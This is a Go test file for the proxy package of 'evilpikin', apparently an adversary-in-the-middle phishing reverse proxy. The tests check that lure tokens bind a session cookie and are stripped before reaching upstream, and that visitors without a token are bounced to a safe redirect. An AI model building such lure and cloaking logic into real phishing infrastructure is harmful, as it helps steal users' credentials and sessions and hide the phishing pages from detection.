package proxy

import (
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/user/evilpikin/pkg/config"
	"github.com/user/evilpikin/pkg/lures"
)

func newLureEngine(t *testing.T) (*ProxyEngine, *lures.Registry, string) {
	t.Helper()
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/plain")
		w.Write([]byte("UPSTREAM_OK host=" + r.Host + " q=" + r.URL.RawQuery))
	}))
	t.Cleanup(upstream.Close)
	upstreamHost := strings.TrimPrefix(upstream.URL, "http://")

	cfg := config.NewRuntimeConfig()
	cfg.SetTarget("login.evilpikin.com", upstreamHost)

	reg := lures.NewRegistry()
	l, err := reg.Create("login-reset", "login.evilpikin.com", "")
	if err != nil {
		t.Fatal(err)
	}
	eng := NewProxyEngine(cfg)
	eng.Scheme = "http"
	eng.SetLures(reg)
	return eng, reg, l.ID
}

func TestProxyLureValidTokenBindsSessionAndStripsParam(t *testing.T) {
	eng, _, id := newLureEngine(t)

	req := httptest.NewRequest("GET", "http://login.evilpikin.com/login-reset?id="+id, nil)
	req.Host = "login.evilpikin.com"
	rec := httptest.NewRecorder()
	eng.ServeHTTP(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d", rec.Code)
	}
	if !strings.Contains(rec.Body.String(), "UPSTREAM_OK") {
		t.Fatalf("body not proxied: %q", rec.Body.String())
	}
	// Lure param must be stripped before reaching upstream.
	if strings.Contains(rec.Body.String(), "id="+id) {
		t.Fatalf("lure param leaked to upstream: %q", rec.Body.String())
	}
	// EP_SESS cookie must be set.
	var gotCookie bool
	for _, c := range rec.Result().Cookies() {
		if c.Name == lures.SessionCookieName {
			gotCookie = true
		}
	}
	if !gotCookie {
		t.Fatal("EP_SESS cookie not set on valid lure hit")
	}
}

func TestProxyLureRequireModeBouncesUnknownVisitor(t *testing.T) {
	eng, _, _ := newLureEngine(t)
	eng.SetRequireLure(true)

	// No token, no session cookie -> bounce to safe redirect.
	req := httptest.NewRequest("GET", "http://login.evilpikin.com/", nil)
	req.Host = "login.evilpikin.com"
	rec := httptest.NewRecorder()
	eng.ServeHTTP(rec, req)

	if rec.Code != http.StatusFound {
		t.Fatalf("expected 302 bounce, got %d", rec.Code)
	}
	if loc := rec.Header().Get("Location"); loc != lures.DefaultSafeRedirect {
		t.Fatalf("bounce location = %q", loc)
	}
}

func TestProxyLureRequireModeAllowsValidToken(t *testing.T) {
	eng, _, id := newLureEngine(t)
	eng.SetRequireLure(true)

	req := httptest.NewRequest("GET", "http://login.evilpikin.com/login-reset?id="+id, nil)
	req.Host = "login.evilpikin.com"
	rec := httptest.NewRecorder()
	eng.ServeHTTP(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf("valid token rejected in require mode: %d", rec.Code)
	}
}

func TestProxyLureDisabledWhenNoRegistry(t *testing.T) {
	// Engine without a registry must behave exactly like before (no guard): an
	// unmapped host is rejected with 404.
	cfg := config.NewRuntimeConfig()
	eng := NewProxyEngine(cfg)
	eng.Scheme = "http"
	req := httptest.NewRequest("GET", "http://unknown.evilpikin.com/", nil)
	req.Host = "unknown.evilpikin.com"
	rec := httptest.NewRecorder()
	eng.ServeHTTP(rec, req)
	if rec.Code != http.StatusNotFound {
		t.Fatalf("expected 404 without registry, got %d", rec.Code)
	}
}
